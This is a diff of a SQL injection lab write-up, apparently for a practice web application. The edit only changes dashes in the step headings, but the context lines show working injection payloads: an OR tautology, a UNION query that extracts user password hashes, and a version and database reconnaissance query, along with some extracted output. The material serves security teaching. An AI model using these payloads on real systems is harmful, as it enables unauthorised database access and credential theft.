@@ -91,7 +91,7 @@ Surname: admin
 
 This confirms the application is querying the database using the input value directly.
 
-### Step 2: Payload 1 — Basic OR Injection
+### Step 2: Payload 1 - Basic OR Injection
 
 **Payload:** `1' OR '1'='1`
 
@@ -106,7 +106,7 @@ First name: Bob, Surname: Smith
 
 See screenshot: `sqli1_basic_injection.png`
 
-### Step 3: Payload 2 — UNION-Based Password Hash Extraction
+### Step 3: Payload 2 - UNION-Based Password Hash Extraction
 
 **Payload:** `1' UNION SELECT user, password FROM users#`
 
@@ -123,7 +123,7 @@ smithy : 5f4dcc3b5aa765d61d8327deb882cf99
 
 See screenshot: `sqli2_union_injection.png`
 
-### Step 4: Payload 3 — Database Reconnaissance
+### Step 4: Payload 3 - Database Reconnaissance
 
 **Payload:** `1' UNION SELECT version(), database()#`
 
